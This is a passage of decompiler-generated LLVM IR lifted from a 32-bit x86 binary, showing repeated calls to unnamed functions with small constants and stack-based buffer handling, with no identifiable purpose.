  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_8051d50()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_8051d50()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049044, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
